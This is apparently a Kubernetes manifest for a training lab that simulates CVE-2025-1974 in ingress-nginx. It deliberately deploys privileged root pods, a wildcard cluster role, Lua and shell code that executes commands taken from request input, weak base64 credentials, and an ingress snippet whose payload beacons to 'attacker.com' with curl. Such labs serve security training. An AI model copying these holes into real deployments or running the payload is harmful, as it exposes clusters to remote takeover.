apiVersion: v1
kind: Namespace
metadata:
  name: cve-2025-1974-lab
  labels:
    kubeshadow.lab: "true"
    kubeshadow.cve: "2025-1974"
    kubeshadow.severity: "critical"
    kubeshadow.category: "rce"
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: vulnerable-sa
  namespace: cve-2025-1974-lab
  labels:
    kubeshadow.lab: "true"
    kubeshadow.cve: "2025-1974"
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: vulnerable-cluster-role
  labels:
    kubeshadow.lab: "true"
    kubeshadow.cve: "2025-1974"
rules:
- apiGroups: [""]
  resources: ["*"]
  verbs: ["*"]
- apiGroups: ["networking.k8s.io"]
  resources: ["ingresses"]
  verbs: ["*"]
- apiGroups: ["extensions"]
  resources: ["ingresses"]
  verbs: ["*"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: vulnerable-cluster-role-binding
  labels:
    kubeshadow.lab: "true"
    kubeshadow.cve: "2025-1974"
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: vulnerable-cluster-role
subjects:
- kind: ServiceAccount
  name: vulnerable-sa
  namespace: cve-2025-1974-lab
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: vulnerable-config
  namespace: cve-2025-1974-lab
  labels:
    kubeshadow.lab: "true"
    kubeshadow.cve: "2025-1974"
data:
  nginx.conf: |
    # Vulnerable nginx configuration allowing code injection
    server {
        listen 80;
        server_name _;
        
        # Vulnerable configuration snippet that allows RCE
        location /vulnerable {
            # This configuration snippet is vulnerable to CVE-2025-1974
            # It allows arbitrary code execution through nginx configuration
            access_log off;
            proxy_pass http://127.0.0.1:9999;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        }
        
        # Another vulnerable location block
        location /rce {
            # This location block is vulnerable to code injection
            content_by_lua_block {
                -- Vulnerable Lua code that can be exploited
                local cmd = ngx.var.arg_cmd
                if cmd then
                    os.execute(cmd)
                end
            }
        }
    }
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: vulnerable-nginx
  namespace: cve-2025-1974-lab
  labels:
    kubeshadow.lab: "true"
    kubeshadow.cve: "2025-1974"
spec:
  replicas: 1
  selector:
    matchLabels:
      app: vulnerable-nginx
  template:
    metadata:
      labels:
        app: vulnerable-nginx
        kubeshadow.lab: "true"
        kubeshadow.cve: "2025-1974"
    spec:
      serviceAccountName: vulnerable-sa
      containers:
      - name: nginx
        image: nginx:1.21-alpine
        ports:
        - containerPort: 80
        volumeMounts:
        - name: nginx-config
          mountPath: /etc/nginx/conf.d
        - name: vulnerable-scripts
          mountPath: /scripts
        securityContext:
          # Vulnerable security context
          runAsUser: 0
          runAsGroup: 0
          privileged: true
          allowPrivilegeEscalation: true
          capabilities:
            add: ["ALL"]
        env:
        - name: VULNERABLE_ENV
          value: "CVE-2025-1974"
        - name: ALLOW_CODE_INJECTION
          value: "true"
        resources:
          requests:
            memory: "64Mi"
            cpu: "50m"
          limits:
            memory: "128Mi"
            cpu: "100m"
      volumes:
      - name: nginx-config
        configMap:
          name: vulnerable-config
      - name: vulnerable-scripts
        configMap:
          name: vulnerable-scripts
      hostNetwork: true
      hostPID: true
      hostIPC: true
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: vulnerable-scripts
  namespace: cve-2025-1974-lab
  labels:
    kubeshadow.lab: "true"
    kubeshadow.cve: "2025-1974"
data:
  exploit.sh: |
    #!/bin/bash
    # Vulnerable script that can be exploited through CVE-2025-1974
    echo "Vulnerable script for CVE-2025-1974"
    
    # This script is vulnerable to command injection
    if [ ! -z "$1" ]; then
        eval "$1"
    fi
    
    # Another vulnerable pattern
    echo "Executing: $@"
    $@
---
apiVersion: v1
kind: Service
metadata:
  name: vulnerable-nginx-service
  namespace: cve-2025-1974-lab
  labels:
    kubeshadow.lab: "true"
    kubeshadow.cve: "2025-1974"
spec:
  selector:
    app: vulnerable-nginx
  ports:
  - port: 80
    targetPort: 80
    protocol: TCP
  type: ClusterIP
---
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: vulnerable-ingress
  namespace: cve-2025-1974-lab
  labels:
    kubeshadow.lab: "true"
    kubeshadow.cve: "2025-1974"
  annotations:
    # Vulnerable annotations that enable CVE-2025-1974
    nginx.ingress.kubernetes.io/configuration-snippet: |
      # This configuration snippet is vulnerable to CVE-2025-1974
      # It allows arbitrary code execution through nginx configuration
      location /exploit {
          access_log off;
          proxy_pass http://127.0.0.1:9999;
          proxy_set_header Host $host;
          proxy_set_header X-Real-IP $remote_addr;
          proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
      }
      
      # Another vulnerable location block
      location /rce {
          content_by_lua_block {
              os.execute("curl http://attacker.com/beacon")
          }
      }
    
    # Additional vulnerable annotations
    nginx.ingress.kubernetes.io/server-snippet: |
      # Vulnerable server snippet
      location /server-exploit {
          access_log off;
          proxy_pass http://127.0.0.1:9999;
      }
    
    nginx.ingress.kubernetes.io/upstream-vhost: "vulnerable.example.com"
    
    # Vulnerable rewrite annotations
    nginx.ingress.kubernetes.io/rewrite-target: "/$1"
    nginx.ingress.kubernetes.io/use-regex: "true"
    
    # Vulnerable SSL annotations
    nginx.ingress.kubernetes.io/ssl-redirect: "true"
    nginx.ingress.kubernetes.io/force-ssl-redirect: "true"
    
    # Vulnerable rate limiting annotations
    nginx.ingress.kubernetes.io/rate-limit: "100"
    nginx.ingress.kubernetes.io/rate-limit-window: "1m"
    
    # Vulnerable CORS annotations
    nginx.ingress.kubernetes.io/enable-cors: "true"
    nginx.ingress.kubernetes.io/cors-allow-origin: "*"
    nginx.ingress.kubernetes.io/cors-allow-methods: "GET, POST, PUT, DELETE, OPTIONS"
    nginx.ingress.kubernetes.io/cors-allow-headers: "*"
    
    # Vulnerable authentication annotations
    nginx.ingress.kubernetes.io/auth-type: "basic"
    nginx.ingress.kubernetes.io/auth-secret: "vulnerable-auth"
    nginx.ingress.kubernetes.io/auth-realm: "Vulnerable Realm"
    
    # Vulnerable proxy annotations
    nginx.ingress.kubernetes.io/proxy-body-size: "0"
    nginx.ingress.kubernetes.io/proxy-connect-timeout: "0"
    nginx.ingress.kubernetes.io/proxy-send-timeout: "0"
    nginx.ingress.kubernetes.io/proxy-read-timeout: "0"
    
    # Vulnerable client body annotations
    nginx.ingress.kubernetes.io/client-body-buffer-size: "0"
    nginx.ingress.kubernetes.io/client-header-buffer-size: "0"
    nginx.ingress.kubernetes.io/client-max-body-size: "0"
    
    # Vulnerable upstream annotations
    nginx.ingress.kubernetes.io/upstream-hash-by: "vulnerable"
    nginx.ingress.kubernetes.io/upstream-keepalive-connections: "0"
    nginx.ingress.kubernetes.io/upstream-keepalive-requests: "0"
    nginx.ingress.kubernetes.io/upstream-keepalive-timeout: "0"
    
    # Vulnerable session annotations
    nginx.ingress.kubernetes.io/session-cookie-name: "vulnerable"
    nginx.ingress.kubernetes.io/session-cookie-path: "/"
    nginx.ingress.kubernetes.io/session-cookie-max-age: "0"
    
    # Vulnerable load balancing annotations
    nginx.ingress.kubernetes.io/load-balance: "round_robin"
    
    # Vulnerable monitoring annotations
    nginx.ingress.kubernetes.io/enable-access-log: "true"
    nginx.ingress.kubernetes.io/enable-rewrite-log: "true"
    
    # Vulnerable security annotations
    nginx.ingress.kubernetes.io/ssl-protocols: "TLSv1 TLSv1.1 TLSv1.2"
    nginx.ingress.kubernetes.io/ssl-ciphers: "ALL:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA"
    
    # Vulnerable custom annotations
    kubeshadow.vulnerable: "true"
    kubeshadow.cve: "2025-1974"
    kubeshadow.severity: "critical"
    kubeshadow.description: "CVE-2025-1974 ingress-nginx RCE vulnerability"
    kubeshadow.exploit: "nginx.ingress.kubernetes.io/configuration-snippet"
    kubeshadow.payload: "os.execute('curl http://attacker.com/beacon')"
    kubeshadow.impact: "Remote Code Execution"
    kubeshadow.cvss: "9.8"
    kubeshadow.vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
spec:
  ingressClassName: nginx
  rules:
  - host: vulnerable.example.com
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: vulnerable-nginx-service
            port:
              number: 80
---
apiVersion: v1
kind: Secret
metadata:
  name: vulnerable-auth
  namespace: cve-2025-1974-lab
  labels:
    kubeshadow.lab: "true"
    kubeshadow.cve: "2025-1974"
type: Opaque
data:
  # Vulnerable authentication credentials
  # admin:admin (base64 encoded)
  auth: YWRtaW46YWRtaW4=
  # root:password (base64 encoded)
  root: cm9vdDpwYXNzd29yZA==
  # user:user (base64 encoded)
  user: dXNlcjp1c2Vy
---
apiVersion: v1
kind: Pod
metadata:
  name: vulnerable-pod
  namespace: cve-2025-1974-lab
  labels:
    kubeshadow.lab: "true"
    kubeshadow.cve: "2025-1974"
  annotations:
    kubeshadow.vulnerable: "true"
    kubeshadow.cve: "2025-1974"
    kubeshadow.severity: "critical"
    kubeshadow.description: "CVE-2025-1974 ingress-nginx RCE vulnerability"
    kubeshadow.exploit: "nginx.ingress.kubernetes.io/configuration-snippet"
    kubeshadow.payload: "os.execute('curl http://attacker.com/beacon')"
    kubeshadow.impact: "Remote Code Execution"
    kubeshadow.cvss: "9.8"
    kubeshadow.vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
spec:
  serviceAccountName: vulnerable-sa
  containers:
  - name: vulnerable-container
    image: nginx:1.21-alpine
    ports:
    - containerPort: 80
    env:
    - name: VULNERABLE_ENV
      value: "CVE-2025-1974"
    - name: ALLOW_CODE_INJECTION
      value: "true"
    - name: NGINX_CONFIG_SNIPPET
      value: "location /exploit { access_log off; proxy_pass http://127.0.0.1:9999; }"
    securityContext:
      # Vulnerable security context
      runAsUser: 0
      runAsGroup: 0
      privileged: true
      allowPrivilegeEscalation: true
      capabilities:
        add: ["ALL"]
    volumeMounts:
    - name: vulnerable-config
      mountPath: /etc/nginx/conf.d
    - name: vulnerable-scripts
      mountPath: /scripts
    resources:
      requests:
        memory: "64Mi"
        cpu: "50m"
      limits:
        memory: "128Mi"
        cpu: "100m"
  volumes:
  - name: vulnerable-config
    configMap:
      name: vulnerable-config
  - name: vulnerable-scripts
    configMap:
      name: vulnerable-scripts
  hostNetwork: true
  hostPID: true
  hostIPC: true
---
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
  namespace: cve-2025-1974-lab
  labels:
    kubeshadow.lab: "true"
    kubeshadow.cve: "2025-1974"
    kubeshadow.secure: "true"
  annotations:
    kubeshadow.secure: "true"
    kubeshadow.cve: "2025-1974"
    kubeshadow.description: "Secure pod configuration for CVE-2025-1974"
    kubeshadow.mitigation: "Proper nginx configuration without code injection"
spec:
  serviceAccountName: default
  containers:
  - name: secure-container
    image: nginx:1.21-alpine
    ports:
    - containerPort: 80
    env:
    - name: SECURE_ENV
      value: "CVE-2025-1974-mitigated"
    - name: ALLOW_CODE_INJECTION
      value: "false"
    securityContext:
      # Secure security context
      runAsUser: 101
      runAsGroup: 101
      runAsNonRoot: true
      privileged: false
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop: ["ALL"]
    volumeMounts:
    - name: nginx-config
      mountPath: /etc/nginx/conf.d
      readOnly: true
    - name: tmp
      mountPath: /tmp
    - name: var-cache
      mountPath: /var/cache/nginx
    - name: var-run
      mountPath: /var/run
    resources:
      requests:
        memory: "64Mi"
        cpu: "50m"
      limits:
        memory: "128Mi"
        cpu: "100m"
  volumes:
  - name: nginx-config
    configMap:
      name: secure-config
  - name: tmp
    emptyDir: {}
  - name: var-cache
    emptyDir: {}
  - name: var-run
    emptyDir: {}
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: secure-config
  namespace: cve-2025-1974-lab
  labels:
    kubeshadow.lab: "true"
    kubeshadow.cve: "2025-1974"
    kubeshadow.secure: "true"
data:
  nginx.conf: |
    # Secure nginx configuration that mitigates CVE-2025-1974
    server {
        listen 80;
        server_name _;
        
        # Secure configuration without code injection
        location /secure {
            access_log on;
            proxy_pass http://127.0.0.1:8080;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        }
        
        # Secure location block without code injection
        location /safe {
            return 200 "Safe endpoint";
            add_header Content-Type text/plain;
        }
    }
